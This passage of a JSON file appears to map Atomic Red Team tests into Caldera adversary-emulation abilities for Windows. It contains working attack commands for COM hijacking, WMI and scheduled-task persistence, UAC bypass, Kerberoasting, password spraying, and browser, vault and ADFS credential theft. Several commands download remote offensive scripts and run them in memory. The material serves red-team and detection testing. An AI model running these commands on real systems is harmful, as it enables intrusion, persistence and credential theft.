                    "command": "reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest\" /ve /T REG_SZ /d \"AtomicTest\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest.1.00\" /ve /T REG_SZ /d \"AtomicTest\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest\\CLSID\" /ve /T REG_SZ /d \"{00000001-0000-0000-0000-0000FEEDACDC}\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest.1.00\\CLSID\" /ve /T REG_SZ /d \"{00000001-0000-0000-0000-0000FEEDACDC}\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\" /ve /T REG_SZ /d \"AtomicTest\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\InprocServer32\" /ve /T REG_SZ /d \"C:\\WINDOWS\\system32\\scrobj.dll\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\InprocServer32\" /v \"ThreadingModel\" /T REG_SZ /d \"Apartment\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\ProgID\" /ve /T REG_SZ /d \"AtomicTest\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\ScriptletURL\" /ve /T REG_SZ /d \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/src/TreatAs.sct\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\VersionIndependentProgID\" /ve /T REG_SZ /d \"AtomicTest\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\\TreatAs\" /ve /T REG_SZ /d \"{00000001-0000-0000-0000-0000FEEDACDC}\" /f; rundll32.exe -sta \"AtomicTest\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "2db3b2385ba856424bfe130f69fc0529",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "2db3b2385ba856424bfe130f69fc0529"
    },
    "T1574.011__multiple__Hijack Execution Flow: Services Registry Permissions Weakness__6d3a92f7fc3d8abeea37531cfba7c79e": {
        "description": "Service registry permissions weakness check and then which can lead to privilege escalation with ImagePath. eg.\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\#{weak_service_name}\" /f /v ImagePath /d \"C:\\temp\\AtomicRedteam.exe\"\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1574.011",
            "name": "Hijack Execution Flow: Services Registry Permissions Weakness"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "get-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\* |FL; get-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\weakservicename |FL",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "6d3a92f7fc3d8abeea37531cfba7c79e",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "6d3a92f7fc3d8abeea37531cfba7c79e"
    },
    "T1053.005__multiple__Scheduled Task/Job: Scheduled Task__5e744dc6fc70da028ccd50f7e73ee0be": {
        "description": "Create an scheduled task that executes calc.exe after user login from XML that contains hidden setting attribute. \nThis technique was seen several times in tricbot malware and also with the targetted attack campaigne the industroyer2.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1053.005",
            "name": "Scheduled Task/Job: Scheduled Task"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Unregister-ScheduledTask -TaskName \"atomic red team\" -confirm:$false >$null 2>&1",
                    "command": "$xml = [System.IO.File]::ReadAllText(\"54d4ab_T1053_05_SCTASK_HIDDEN_ATTRIB.xml\"); Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \"Root\\Microsoft\\Windows\\TaskScheduler\" -MethodName \"RegisterByXml\" -Arguments @{ Force = $true; Xml =$xml; }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "54d4ab_T1053_05_SCTASK_HIDDEN_ATTRIB.xml"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "5e744dc6fc70da028ccd50f7e73ee0be",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "5e744dc6fc70da028ccd50f7e73ee0be"
    },
    "T1546__multiple__Event Triggered Execution__6fb0cdea444d58a340896d606baf281a": {
        "description": "The following Atomic will create a New-CimSession on a remote endpoint and start a process usnig Invoke-CimMethod.\nThis is a novel way to perform lateral movement or to start a remote process.\nThis does require WinRM to be enabled. The account performing the run will also need to be elevated.\nA successful execution will stdout that the process started. On the remote endpoint, wmiprvse.exe will spawn the given process.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1546",
            "name": "Event Triggered Execution"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": " $RemoteComputer = \"localhost\";  $PWord = ConvertTo-SecureString -String \"P@ssword1\" -AsPlainText -Force;  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"Administrator\", $Pword;  $CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credential;  $ProcessToStart = \"calc.exe\";  $Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart};  if ($Result.ReturnValue -eq 0) {;      Write-Host \"Process started successfully with Process ID: $($Result.ProcessId)\";  } else {;      Write-Host \"Failed to start the process. Error code: $($Result.ReturnValue)\";  };  Remove-CimSession -CimSession $CimSession",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "6fb0cdea444d58a340896d606baf281a",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "6fb0cdea444d58a340896d606baf281a"
    },
    "T1546.015__multiple__Event Triggered Execution: Component Object Model Hijacking__d94bcdfc9d0f769b062e1960f7af6804": {
        "description": "Use the PowerShell to execute COM CLSID object.\nReference: https://pentestlab.blog/2020/05/20/persistence-com-hijacking/",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1546.015",
            "name": "Event Triggered Execution: Component Object Model Hijacking"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Get-Process -Name \"*calc\" | Stop-Process",
                    "command": "$o= [activator]::CreateInstance([type]::GetTypeFromCLSID(\"9BA05972-F6A8-11CF-A442-00A0C90A8F39\")); $item = $o.Item(); $item.Document.Application.ShellExecute(\"cmd.exe\",\"/c calc.exe\",\"C:\\windows\\system32\",$null,0)",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "d94bcdfc9d0f769b062e1960f7af6804",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "d94bcdfc9d0f769b062e1960f7af6804"
    },
    "T1053.005__multiple__Scheduled Task/Job: Scheduled Task__54b98f924ee4613c7d927a3ea1dd260a": {
        "description": "Create an scheduled task that executes notepad.exe after user login from XML by leveraging WMI class PS_ScheduledTask. Does the same thing as Register-ScheduledTask cmdlet behind the scenes.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1053.005",
            "name": "Scheduled Task/Job: Scheduled Task"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Unregister-ScheduledTask -TaskName \"T1053_005_WMI\" -confirm:$false >$null 2>&1",
                    "command": "$xml = [System.IO.File]::ReadAllText(\"2cc1c4_T1053_005_WMI.xml\"); Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \"Root\\Microsoft\\Windows\\TaskScheduler\" -MethodName \"RegisterByXml\" -Arguments @{ Force = $true; Xml =$xml; }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "2cc1c4_T1053_005_WMI.xml"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "54b98f924ee4613c7d927a3ea1dd260a",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "54b98f924ee4613c7d927a3ea1dd260a"
    },
    "T1546.003__multiple__Event Triggered Execution: Windows Management Instrumentation Event Subscription__248be98ef985ef5053a26ed7cd929c14": {
        "description": "The following Atomic will utilize MOFComp.exe to load a local MOF file.\nThe Managed Object Format (MOF) compiler parses a file containing MOF statements and adds the classes and class instances defined in the file to the WMI repository. \nTo query for the class:  gwmi __eventfilter -namespace root\\subscription\nA successful execution will add the class to WMI root namespace.\nReference: https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/ and https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1546.003",
            "name": "Event Triggered Execution: Windows Management Instrumentation Event Subscription"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter \"Name = 'AtomicRedTeam_consumer'\"; $EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter \"Name = 'AtomicRedTeam_filter'\"; $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query \"REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding\" -ErrorAction SilentlyContinue; $FilterConsumerBindingToCleanup | Remove-WmiObject; $EventConsumerToCleanup | Remove-WmiObject; $EventFilterToCleanup | Remove-WmiObject",
                    "command": "c:\\windows\\system32\\wbem\\mofcomp.exe \"715d8f_T1546.003.mof\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "715d8f_T1546.003.mof"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "248be98ef985ef5053a26ed7cd929c14",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "248be98ef985ef5053a26ed7cd929c14"
    },
    "T1546.003__multiple__Event Triggered Execution: Windows Management Instrumentation Event Subscription__4df4fdb269f34dd6d55969c83ff06c73": {
        "description": "Run from an administrator powershell window. After running, reboot the victim machine.\nAfter it has been online for 4 minutes you should see notepad.exe running as SYSTEM.\n\nCode references\n\nhttps://gist.github.com/mgreen27/ef726db0baac5623dc7f76bfa0fc494c\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1546.003",
            "name": "Event Triggered Execution: Windows Management Instrumentation Event Subscription"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class ActiveScriptEventConsumer -Filter \"Name = 'AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example'\"; $EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter \"Name = 'AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example'\"; $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query \"REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding\" -ErrorAction SilentlyContinue; $FilterConsumerBindingToCleanup | Remove-WmiObject; $EventConsumerToCleanup | Remove-WmiObject; $EventFilterToCleanup | Remove-WmiObject",
                    "command": "$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';                 EventNameSpace='root\\CimV2';                 QueryLanguage=\"WQL\";                 Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"}; $Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments $FilterArgs; $ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';                 ScriptingEngine='VBScript';                 ScriptText=';                 Set objws = CreateObject(\"Wscript.Shell\");                 objws.Run \"notepad.exe\", 0, True;                 '}; $Consumer=Set-WmiInstance -Namespace \"root\\subscription\" -Class ActiveScriptEventConsumer -Arguments $ConsumerArgs; $FilterToConsumerArgs = @{; Filter = $Filter; Consumer = $Consumer; }; $FilterToConsumerBinding = Set-WmiInstance -Namespace 'root/subscription' -Class '__FilterToConsumerBinding' -Arguments $FilterToConsumerArgs",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "4df4fdb269f34dd6d55969c83ff06c73",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "4df4fdb269f34dd6d55969c83ff06c73"
    },
    "T1547.004__multiple__Boot or Logon Autostart Execution: Winlogon Helper DLL__dc74af5b90b9cbb4dcfbcaaa3e412a5e": {
        "description": "PowerShell code to set Winlogon shell key to execute a binary at logon along with explorer.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.004",
            "name": "Boot or Logon Autostart Execution: Winlogon Helper DLL"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" -Name \"Shell\" -Force -ErrorAction Ignore",
                    "command": "Set-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Shell\" \"explorer.exe, C:\\Windows\\System32\\cmd.exe\" -Force",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "dc74af5b90b9cbb4dcfbcaaa3e412a5e",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "dc74af5b90b9cbb4dcfbcaaa3e412a5e"
    },
    "T1548.002__multiple__Abuse Elevation Control Mechanism: Bypass User Account Control__b473176c321f31824c909c73807caf92": {
        "description": "UAC Bypass DccwBypassUAC technique via function of WinPwn",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1548.002",
            "name": "Abuse Elevation Control Mechanism: Bypass User Account Control"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b473176c321f31824c909c73807caf92",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "b473176c321f31824c909c73807caf92"
    },
    "T1091__multiple__Replication Through Removable Media__95f9e48ea1fbdac2f1c7c656b655ae4c": {
        "description": "Simulates an adversary copying malware to all connected removable drives. \n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1091",
            "name": "Replication Through Removable Media"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter \"drivetype=2\" | select-object -expandproperty DeviceID; ForEach ($Drive in $RemovableDrives); {; Remove-Item -Path $Drive\\T1091Test1.txt -Force -ErrorAction Ignore; }",
                    "command": "$RemovableDrives=@(); $RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter \"drivetype=2\" | select-object -expandproperty DeviceID; ForEach ($Drive in $RemovableDrives); {; write-host \"Removable Drive Found:\" $Drive; New-Item -Path $Drive/T1091Test1.txt -ItemType \"file\" -Force -Value \"T1091 Test 1 has created this file to simulate malware spread to removable drives.\"; }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "95f9e48ea1fbdac2f1c7c656b655ae4c",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "95f9e48ea1fbdac2f1c7c656b655ae4c"
    },
    "T1187__credential-access__Forced Authentication__608b7021a5b8369e9fd858feba6f5611": {
        "description": "This module runs the Windows executable of PetitPotam in order to coerce authentication for a remote system.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1187",
            "name": "Forced Authentication"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "& \"PathToAtomicsFolder\\..\\ExternalPayloads\\PetitPotam.exe\" 10.0.0.3 10.0.0.2 1; Write-Host \"End of PetitPotam attack\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "608b7021a5b8369e9fd858feba6f5611",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "608b7021a5b8369e9fd858feba6f5611"
    },
    "T1558.003__credential-access__Steal or Forge Kerberos Tickets: Kerberoasting__efdca41c8a098f89f2db9c334627d8ac": {
        "description": "Kerberoasting technique via function of WinPwn",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1558.003",
            "name": "Steal or Forge Kerberos Tickets: Kerberoasting"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); Kerberoasting -consoleoutput -noninteractive",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "efdca41c8a098f89f2db9c334627d8ac",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "efdca41c8a098f89f2db9c334627d8ac"
    },
    "T1110.003__credential-access__Brute Force: Password Spraying__7404470d9fed6da5e72123a6b360ce31": {
        "description": "This test attempts to brute force a list of Microsoft Online (Azure/O365) users with a single password via the MSOLSpray Powershell module.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1110.003",
            "name": "Brute Force: Password Spraying"
        },
        "platforms": {
            "unknown": {
                "psh": {
                    "cleanup": "",
                    "command": "import-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\MSOLSpray.ps1\"; Invoke-MSOLSpray -UserList \"$env:temp\\T1110.003UserList.txt\" -Password \"P@ssword1\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "7404470d9fed6da5e72123a6b360ce31",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "7404470d9fed6da5e72123a6b360ce31"
    },
    "T1555__credential-access__Credentials from Password Stores__6bbb6f8b1db42e2c2c79892e8c31feb3": {
        "description": "This module will enumerate credentials stored in Windows Credentials vault of Windows Credential Manager using builtin utility vaultcmd.exe",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1555",
            "name": "Credentials from Password Stores"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "vaultcmd /listcreds:\"Windows Credentials\" /all",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "6bbb6f8b1db42e2c2c79892e8c31feb3",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "6bbb6f8b1db42e2c2c79892e8c31feb3"
    },
    "T1558.003__credential-access__Steal or Forge Kerberos Tickets: Kerberoasting__eedc7881da4d2fddb5c56fb96aaeecfd": {
        "description": "Information on the Rubeus tool and it's creators found here: https://github.com/GhostPack/Rubeus#asreproast\nThis build targets .NET 4.5.  If targeting a different version you will need to compile Rubeus\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1558.003",
            "name": "Steal or Forge Kerberos Tickets: Kerberoasting"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus_output.txt\" -ErrorAction Ignore",
                    "command": "klist purge; cmd.exe /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\" kerberoast None /outfile:\"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus_output.txt\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "eedc7881da4d2fddb5c56fb96aaeecfd",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "eedc7881da4d2fddb5c56fb96aaeecfd"
    },
    "T1555.003__credential-access__Credentials from Password Stores: Credentials from Web Browsers__954860df5054a5fabc114abefd8e45f6": {
        "description": "Collect Browser credentials as well as the history via winpwn browserpwn function of WinPwn.",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1555.003",
            "name": "Credentials from Password Stores: Credentials from Web Browsers"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "rm .\\System.Data.SQLite.dll -ErrorAction Ignore",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); browserpwn -consoleoutput -noninteractive",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "954860df5054a5fabc114abefd8e45f6",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "954860df5054a5fabc114abefd8e45f6"
    },
    "T1110.003__credential-access__Brute Force: Password Spraying__e5168b0f7e57ba7b20c9842a350bb539": {
        "description": "Test a single password against a list of users\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1110.003",
            "name": "Brute Force: Password Spraying"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"; .\\kerbrute.exe passwordspray --dc $ENV:userdnsdomain -d $ENV:userdomain \"PathToAtomicsFolder\\..\\ExternalPayloads\\passwordspray.txt\" password132",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e5168b0f7e57ba7b20c9842a350bb539",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "e5168b0f7e57ba7b20c9842a350bb539"
    },
    "T1552.004__credential-access__Unsecured Credentials: Private Keys__745d16045bcf10379b8cf2fa45f2b66e": {
        "description": "Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as a Domain Administrators user on a domain-joined computer.\nBased on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1552.004",
            "name": "Unsecured Credentials: Private Keys"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Path \".\\ADFS_encryption.pfx\" -ErrorAction Ignore; Remove-Item -Path \".\\ADFS_signing.pfx\" -ErrorAction Ignore",
                    "command": "Import-Module ActiveDirectory -Force ; Import-Module AADInternals -Force | Out-Null; $dcServerName = (Get-ADDomainController).HostName; $svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq \"#{adfs_service_account_name}\"; $PWord = ConvertTo-SecureString -String \"#{replication_password}\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList; $hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex; $ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server; $Configuration = [xml]$ADFSConfig; $group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group; $container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName; $parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn; $base = \"LDAP://CN=$group,$container,$parent\"; $ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base)); $ADSearch.Filter = '(name=CryptoPolicy)'; $ADSearch.PropertiesToLoad.Clear(); $ADSearch.PropertiesToLoad.Add(\"displayName\") | Out-Null; $aduser = $ADSearch.FindOne(); $keyObjectGuid = $ADUser.Properties[\"displayName\"] ; $ADSearch.PropertiesToLoad.Clear(); $ADSearch.PropertiesToLoad.Add(\"thumbnailphoto\") | Out-Null; $ADSearch.Filter=\"(l=$keyObjectGuid)\"; $aduser=$ADSearch.FindOne() ; $key=[byte[]]$aduser.Properties[\"thumbnailphoto\"][0] ; Export-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key; Get-ChildItem | Where-Object {$_ -like \"ADFS*\"}; Write-Host \"`nCertificates retrieved successfully\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "745d16045bcf10379b8cf2fa45f2b66e",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "745d16045bcf10379b8cf2fa45f2b66e"
    },
    "T1528__credential-access__Steal Application Access Token__22dda265607e5cecaa9ee0f0f65b7dfd": {
        "description": "Upon successful execution of this test, the names, locations, and contents of key vaults within an Azure account will be output to a file.\nSee - https://www.netspi.com/blog/technical/cloud-penetration-testing/a-beginners-guide-to-gathering-azure-passwords/",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1528",
            "name": "Steal Application Access Token"
        },
        "platforms": {
            "unknown": {
                "psh": {
                    "cleanup": "remove-item $env:temp\\T1528Test1.txt -force -erroraction silentlycontinue",
                    "command": "import-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\Get-AzurePasswords.ps1\"; $Password = ConvertTo-SecureString -String \"T1082Az\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"None\", $Password; Connect-AzureRmAccount -Credential $Credential; Get-AzurePasswords -subscription 'None' > $env:temp\\T1528Test1.txt; cat $env:temp\\T1528Test1.txt",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "22dda265607e5cecaa9ee0f0f65b7dfd",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "22dda265607e5cecaa9ee0f0f65b7dfd"
    },
    "T1539__credential-access__Steal Web Session Cookie__126aaf80c6a232eaf08dcef3163d4aed": {
        "description": "This test queries Chrome's SQLite database to steal the encrypted cookie data, designed to function similarly to Zloader/Zbot's cookie theft function. \nOnce an adversary obtains the encrypted cookie info, they could go on to decrypt the encrypted value, potentially allowing for session theft. \nNote: If Chrome is running, the process will be killed to ensure that the DB file isn't locked. \nSee https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf. \n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1539",
            "name": "Steal Web Session Cookie"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "remove-item PathToAtomicsFolder\\..\\ExternalPayloads\\T1539ChromeCookies.txt",
